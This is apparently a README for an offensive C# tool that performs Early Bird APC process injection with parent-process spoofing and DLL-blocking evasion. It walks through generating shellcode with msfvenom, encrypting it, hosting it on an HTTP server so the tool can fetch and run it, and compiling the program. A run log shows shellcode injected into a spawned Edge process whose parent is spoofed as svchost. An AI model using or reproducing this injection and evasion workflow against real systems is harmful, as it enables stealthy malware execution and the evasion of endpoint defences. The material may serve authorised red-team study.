# DInvoke-EarlyBird
Early Bird process injection and PPID spoofing technique using DInvoke.

- Fetch shellcode from URL.
- Extract the key from the encrypted shellcode and decrypt it.
- Spawn a target process in suspended state.
  - Using PPID spoofing.
  - Using block dll flag: DLL which has not been signed by Microsoft and attempt to be loaded into the process, will fail.
- Execute shellcode via APC Queue.

# Usage
1. Create and encrypt your shellcode:
```bash
> msfvenom -p windows/x64/exec CMD=calc.exe -f raw > calc.bin
> python3 encrypt calc.bin
[+] Saved encrypted file as encrypted.bin (Size: 304 bytes)
```
2. Host the encrypted payload:
```bash
> python3 -m http.server 80 
```
3. Adjust the line 35 of `Program.cs` to reflect your environment.
4. Compile and run:
```bash
PS> csc /unsafe Program.cs
```

# To-Do
- Implement a process integrity check for PPID spoofing:  
~Currently the PPID spoofing is retrieving a handle to the process specified without checking its integrity. If you are a low-privilege user and try to get a handle to a high privilege process, the program may crash due to access violation.~  
Currently the PPID spoofing is trying to get a handle to all process specified without checking its integrity. This should solve issues when there are multiple processes with different integrity levels. Not ideal, but it works for now.  
For example, specifying `svchost` as a parent:
```
C:\Code\DInvoke-EarlyBird>Program.exe
[i] Trying to get a handle to: svchost
        [-] Error getting handle for svchost (PID: 976): Access is denied
        [-] Error getting handle for svchost (PID: 528): Access is denied
        [-] Error getting handle for svchost (PID: 1752): Access is denied
        [-] Error getting handle for svchost (PID: 9236): Access is denied
        [-] Error getting handle for svchost (PID: 3124): Access is denied
        [-] Error getting handle for svchost (PID: 2532): Access is denied
        [-] Error getting handle for svchost (PID: 1348): Access is denied
        [-] Error getting handle for svchost (PID: 1736): Access is denied
        [-] Error getting handle for svchost (PID: 7560): Access is denied
        [-] Error getting handle for svchost (PID: 2912): Access is denied
        [-] Error getting handle for svchost (PID: 3804): Access is denied
        [-] Error getting handle for svchost (PID: 2120): Access is denied
        [-] Error getting handle for svchost (PID: 4680): Access is denied
        [-] Error getting handle for svchost (PID: 2512): Access is denied
        [-] Error getting handle for svchost (PID: 1916): Access is denied
        [-] Error getting handle for svchost (PID: 2896): Access is denied
[+] Successfully obtained handle: svchost (PID: 4076)
[*] Spawned Target Process: C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
        [*] Parent Process: svchost (PID: 4076)
        [*] Process ID: 1432
        [*] Written to Address: 0x14022B50000
        [*] Protection changed to RX
[*] APC called
        [*] Thread resumed, done.
```

# References
- https://github.com/TheWover/DInvoke
- https://github.com/rasta-mouse/DInvoke
- https://offensivedefence.co.uk/posts/ppidspoof-blockdlls-dinvoke/
- https://github.com/Octoberfest7/OSEP-Tools
- https://trustedsec.com/blog/ppid-spoofing-its-really-this-easy-to-fake-your-parent
